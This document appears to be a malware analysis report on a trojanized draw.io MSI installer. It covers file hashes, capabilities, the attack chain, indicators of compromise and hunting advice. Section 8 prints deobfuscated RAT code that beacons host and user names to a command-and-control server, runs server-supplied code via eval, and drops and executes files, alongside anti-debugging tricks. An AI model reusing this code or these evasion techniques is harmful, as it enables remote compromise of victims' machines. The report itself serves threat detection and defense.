# Malware Analysis Report — UltraPlusSetup.msi

**Date:** 2026-05-21  
**Analyst:** Claude Code / REMnux  
**Sample:** `UltraPlusSetup.msi`

---

## 1. File Metadata

| Field | Value |
|---|---|
| **Filename** | UltraPlusSetup.msi |
| **SHA256** | `1713ae927a08a7ce89723d636819eb9bdb12f1659037e64410f47f2c8cec1de1` |
| **SHA1** | `21692df02657fdf47233a03cd4b81ee193411468` |
| **MD5** | `7b178a6c60c80f0f8b6221e267af79fc` |
| **Size** | 120,373,248 bytes (120 MB) |
| **File Type** | MSI Installer (Compound Document File / OLE2) |
| **Build Tool** | WiX Toolset 7.0.0.0 |
| **Created** | 2026-05-20 00:30:00 UTC |
| **MSI Author** | SuperPlus ProSoftify *(generic/suspicious — not a known publisher)* |
| **MSI Subject** | UltraPlus |
| **Product GUID** | `{43F8790D-F9A4-4CF8-B28F-F8DF1ED05F9F}` |
| **Code Signing** | **None** — MSI is unsigned |
| **VBA Macros** | None |
| **Encrypted** | No |

---

## 2. Classification

**Verdict:** **MALICIOUS** (confidence: HIGH)

**Classification:** Draw.io-Lure Electron RAT — CryptoVista Actor Toolkit  
**Stage:** Full payload (RAT implant delivered via MSI dropper)  
**C2:** `pccvill[.]com/nbw/`

The MSI installs a legitimate copy of the draw.io v19.0.3 Electron desktop application as a lure, while replacing the application's JavaScript entry point (`electron.js` inside `resources/app.asar`) with heavily obfuscated malicious code. The trojanized `electron.js` establishes a persistent C2 beacon, collects victim fingerprinting data, and provides the operator with remote code execution and file-drop capabilities — all running silently inside the trusted Electron process.

---

## 3. Capabilities

### Delivery / Installation
- MSI installer built with WiX Toolset 7.0.0.0, no code signing
- Installs all files to `%LOCALAPPDATA%\EasyCoreQuickWareer\`
- CustomAction `LaunchInstalledApp` runs `draw.io.exe` after installation completes
- Draw.io `app-update.yml` references legitimate `jgraph/drawio-desktop` GitHub repo (updates not blocked — `disableUpdate.js` returns `false`)

### Anti-Analysis (electron.js)
- **Debugger timing check:** `debugger; if (Date.now() - ts > 200) disable_payload()`
- **Console suppression:** all `console.log/warn/error/info/debug/table/trace` methods nulled out via `Object.defineProperty`
- **Code beautifier detection:** checks RegExp `.toString()` whitespace to detect formatted/deobfuscated code
- **Polling anti-debug:** `setInterval(ov, 2500)` and `setInterval(KD, 7000)` run continuously
- **Function.prototype.toString override:** returns `[native code]` for all functions to frustrate devtools

### C2 Communication
- **Protocol:** HTTPS (`require("https")`, Node.js)
- **Endpoint:** `pccvill[.]com/nbw/`
- **Method:** POST, `Content-Type: application/json`
- **TLS verification disabled:** `rejectUnauthorized: false` (accepts self-signed/invalid certs)
- **Polling interval:** every **180 seconds** (3 minutes) via `while(true){ await _(); await W(180000) }`

### Victim Fingerprinting
Beacon POST body (JSON array):
```
[victimUUID, process.env.COMPUTERNAME, process.env.USERNAME, ...readmeKey]
```
- **victimUUID:** random 8-character alphanumeric token generated on first run, persisted to `%APPDATA%\setup.txt`
- **COMPUTERNAME / USERNAME:** Windows environment variables
- **readmeKey:** alphanumeric campaign key parsed from `<exe_dir>\readme.txt` (optional; `null`-spreads to empty if absent); expected format: `<key>` or `<partA>-<partB>` (max 16 alphanum chars each)

### Remote Code Execution
C2 response JSON: `{ "task": { "e": "<JS code>" } }` → executed via **`eval(db.e)`** in Electron main process context (full Node.js API access: filesystem, child_process, network, OS)

### File Drop & Execution
C2 response JSON: `{ "task": { "files": { "<filename>": "<base64>" } } }` →
1. Creates `%TEMP%\<timestamp>\` directory
2. Decodes each file from base64 and writes to the timestamped directory
3. Auto-executes any file ending in `.exe` via `child_process.exec`

### Persistence
- Installation to `%LOCALAPPDATA%\EasyCoreQuickWareer\draw.io.exe` (user-writable path, runs silently as a diagramming app)
- No explicit startup registry key or scheduled task observed in static analysis, but C2 can deliver any persistence payload via `eval(db.e)` or file drop

---

## 4. Attack Chain

```
UltraPlusSetup.msi (unsigned, WiX, "SuperPlus ProSoftify")
  └─► Install %LOCALAPPDATA%\EasyCoreQuickWareer\draw.io.exe + app.asar
  └─► CustomAction: LaunchInstalledApp → draw.io.exe starts
        └─► Electron loads app.asar/electron.js (trojanized)
              └─► Anti-debug checks run
              └─► Read/create victim UUID: %APPDATA%\setup.txt
              └─► Read campaign key: <exe_dir>\readme.txt
              └─► Beacon loop (every 180s):
                    POST https://pccvill.com/nbw/
                    Body: [UUID, COMPUTERNAME, USERNAME, readmeKey]
                    Response: task.e → eval() / task.files → drop+exec
```

---

## 5. IOCs

### Network
| Type | Indicator | Notes |
|---|---|---|
| Domain (defanged) | `pccvill[.]com` | C2 server |
| URL (defanged) | `https[://]pccvill[.]com/nbw/` | Beacon POST endpoint |

### Filesystem
| Path | Purpose |
|---|---|
| `%LOCALAPPDATA%\EasyCoreQuickWareer\` | Install directory |
| `%LOCALAPPDATA%\EasyCoreQuickWareer\draw.io.exe` | Trojanized Electron host (SHA256: `bfcd61c6b2dc98354f1a1a6e20a3d61c94530f2c39f3f4c708252da4db57ba9f`) |
| `%LOCALAPPDATA%\EasyCoreQuickWareer\resources\app.asar` | Contains malicious `electron.js` |
| `%APPDATA%\setup.txt` | Victim UUID storage |
| `<exe_dir>\readme.txt` | Campaign registration key |
| `%TEMP%\<timestamp>\` | File drop staging directory |
| `error.log` | Eval error log (written in exe directory) |

### MSI Properties
| Field | Value |
|---|---|
| Product GUID | `{43F8790D-F9A4-4CF8-B28F-F8DF1ED05F9F}` |
| Embedded CAB files | `cab1.cab` (76 MB unpacked), `cab2.cab` (44 MB unpacked) |
| Lure app | draw.io v19.0.3 (package.json: `"name": "draw.io"`, author JGraph) |

---

## 6. Emulation Results

Emulation was not attempted for this sample. The payload is JavaScript running inside a full Electron/Node.js runtime — speakeasy (x86/x64 PE emulator) cannot emulate this environment. All malicious behavior was recovered via static analysis and manual deobfuscation of `electron.js`.

**Deobfuscation technique:** 542 char-code arrays decoded via `FW()` function (converts integer arrays to strings). C2 URL was stored in array `$x = [112,99,99,118,105,108,108,46,99,111,109,47,110,98,119,47]` → `'pccvill.com/nbw/'`, assigned to `const C = FW($x)`.

---

## 7. Sandbox Results

**ANY.RUN:** Submission failed — file size (120 MB) exceeds Ally tier upload limit.

---

## 8. Static Analysis: electron.js Deobfuscated Key Functions

### Beacon function `_()` (decoded)
```javascript
async function _(){
  try {
    const fi = await m(C, {            // C = 'pccvill.com/nbw/'
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify([K(), process.env.COMPUTERNAME, process.env.USERNAME, ...(N()||[])])
    });
    const e4 = await fi.json();
    if(e4.task){ F(e4.task) }
  } catch(U_){ console.log(U_) }
}
```

### Polling loop `n()` — every 180s
```javascript
async function n(){ while(true){ await _(); await W(180000) } }
(async()=>{ await n(); ... })()
```

### Task dispatcher `F(db)`
```javascript
function F(db){
  if(db.e){
    try{ eval(db.e) }
    catch(xV){ fs.appendFileSync('error.log', ...) }
    return;
  }
  // file drop path:
  const WD = path.join(process.env.TEMP, String(Date.now()));
  fs.mkdirSync(WD, {recursive:true});
  let Ab = null;
  for(const [filename, b64] of Object.entries(db.files||{})){
    const dest = path.join(WD, filename);
    fs.writeFileSync(dest, Buffer.from(b64, 'base64'));
    if(filename.endsWith('.exe')){ Ab = dest }
  }
  if(Ab){ require("child_process").exec(`"${Ab}"`, {cwd:WD}) }
}
```

### Victim UUID `K()` — `%APPDATA%\setup.txt`
```javascript
function K(){
  const t = path.join(process.env.APPDATA, 'setup.txt');
  if(fs.existsSync(t)){ return fs.readFileSync(t,'utf8').trim() }
  const R = Math.random().toString(36).slice(2,10);  // 8-char random
  fs.writeFileSync(t, R);
  return R;
}
```

### Campaign key `N()` — `<exe_dir>\readme.txt`
```javascript
function N(){
  // reads <exe_dir>\readme.txt; expects alphanumeric key "partA-partB" or "key"
  // returns [partA, partB] or [key] or null if absent/invalid
  try {
    let r = fs.readFileSync(process.execPath.replace(/\\[^\\]+$/, '') + '\\readme.txt', 'utf-8').trim();
    // validate: alphanumeric only, max 16 chars per part
    ...
  } catch(f){ return null }
}
```

---

## 9. Analyst Notes

### Cross-reference: CryptoVista Actor Toolkit
This sample uses **identical extracted config values** to previously analyzed samples MegaToolSetup.exe (`6d85bc87...`) and SmartUtilSetup.exe (`a5f73996...`):

| Indicator | This sample | Prior samples |
|---|---|---|
| Victim UUID file | `setup.txt` (exact path) | `setup.txt` (exact path) |
| Campaign key file | `\readme.txt` (exact path) | `\readme.txt` (exact path) |
| Beacon body | `[UUID, COMPUTERNAME, USERNAME, readmeKey]` | identical structure |
| RCE mechanism | `eval(db.e)` | identical |
| File drop pattern | `db.files` → base64 → `%TEMP%\<ts>\` → exec .exe | identical |
| Obfuscation framework | char-array `FW()` decoder + anti-debug suite | identical |

The C2 URL differs (`pccvill[.]com/nbw/` vs prior samples' compromised gov.br servers), indicating either a new infrastructure node or a different campaign. This is consistent with the same actor rotating C2 infrastructure between deployments.

### Residual Gaps
1. **readme.txt distribution mechanism unknown** — the campaign key in `readme.txt` is presumably delivered out-of-band (social engineering, prior compromise, or a separate dropper stage), but no delivery chain was observed
2. **draw.io.exe legitimacy** — `draw.io.exe` SHA256 `bfcd61c6b2dc98354f1a1a6e20a3d61c94530f2c39f3f4c708252da4db57ba9f` appears to be the legitimate Electron host; it is not itself modified — all malicious code lives in `app.asar`
3. **C2 response content unknown** — `pccvill[.]com` was not reachable; actual `eval` payload delivered at runtime is unknown
4. **Persistence mechanism** — no startup registry key or scheduled task was found statically; likely delivered via `eval(db.e)` post-infection
5. **ValuableFileExtensions YARA** (reliability 20) — false positive; the extension list in the CAB data comes from draw.io's file association and export capabilities (supported formats: docx, pdf, png, jpg, svg, vsdx, etc.)

### Recommended Follow-up
- Hunt for `%APPDATA%\setup.txt` and `pccvill[.]com` in EDR telemetry
- Block `pccvill[.]com` at DNS/proxy
- Search endpoint for `%LOCALAPPDATA%\EasyCoreQuickWareer\` directory presence
- Investigate what `readme.txt` content looks like when distributed to victims — it may provide campaign attribution
